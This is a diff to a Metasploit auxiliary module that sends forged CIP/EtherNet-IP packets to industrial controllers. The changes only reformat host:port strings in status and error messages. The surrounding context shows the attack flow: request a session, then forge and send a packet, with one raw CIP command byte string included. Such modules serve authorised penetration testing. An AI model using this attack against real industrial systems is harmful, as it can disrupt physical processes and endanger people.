@@ -58,11 +58,11 @@ class MetasploitModule < Msf::Auxiliary
 
   def run
     attack = datastore['ATTACK']
-    print_status "#{rhost}:#{rport} - CIP - Running #{attack} attack."
+    print_status "#{Rex::Socket.to_authority(rhost, rport)} - CIP - Running #{attack} attack."
     sid = req_session
     if sid
       forge_packet(sid, payload(attack))
-      print_status "#{rhost}:#{rport} - CIP - #{attack} attack complete."
+      print_status "#{Rex::Socket.to_authority(rhost, rport)} - CIP - #{attack} attack complete."
     end
   end
 
@@ -75,10 +75,10 @@ class MetasploitModule < Msf::Auxiliary
     begin
       sock.put(packet)
     rescue ::Interrupt
-      print_error("#{rhost}:#{rport} - CIP - Interrupt during payload")
+      print_error("#{Rex::Socket.to_authority(rhost, rport)} - CIP - Interrupt during payload")
       raise $ERROR_INFO
     rescue ::Rex::HostUnreachable, ::Rex::ConnectionTimeout, ::Rex::ConnectionRefused
-      print_error("#{rhost}:#{rport} - CIP - Network error during payload")
+      print_error("#{Rex::Socket.to_authority(rhost, rport)} - CIP - Network error during payload")
       return nil
     end
   end
@@ -104,19 +104,19 @@ class MetasploitModule < Msf::Auxiliary
           nil
         end
         if session_id
-          print_status("#{rhost}:#{rport} - CIP - Got session id: 0x" + session_id.to_s(16))
+          print_status("#{Rex::Socket.to_authority(rhost, rport)} - CIP - Got session id: 0x" + session_id.to_s(16))
         else
-          print_error("#{rhost}:#{rport} - CIP - Got invalid session id, aborting.")
+          print_error("#{Rex::Socket.to_authority(rhost, rport)} - CIP - Got invalid session id, aborting.")
           return nil
         end
       else
         raise ::Rex::ConnectionTimeout
       end
     rescue ::Interrupt
-      print_error("#{rhost}:#{rport} - CIP - Interrupt during session negotiation")
+      print_error("#{Rex::Socket.to_authority(rhost, rport)} - CIP - Interrupt during session negotiation")
       raise $ERROR_INFO
     rescue ::Rex::HostUnreachable, ::Rex::ConnectionTimeout, ::Rex::ConnectionRefused => e
-      print_error("#{rhost}:#{rport} - CIP - Network error during session negotiation: #{e}")
+      print_error("#{Rex::Socket.to_authority(rhost, rport)} - CIP - Network error during session negotiation: #{e}")
       return nil
     end
     return session_id
@@ -146,7 +146,7 @@ class MetasploitModule < Msf::Auxiliary
       "\x00\x00\x00\x00\x00\x04\x02\x00\x00\x00\x00\x00\xb2\x00\x08\x00" \
         "\x05\x03\x20\x01\x24\x01\x30\x03"
     else
-      print_error("#{rhost}:#{rport} - CIP - Invalid attack option.")
+      print_error("#{Rex::Socket.to_authority(rhost, rport)} - CIP - Invalid attack option.")
       return nil
     end
   end
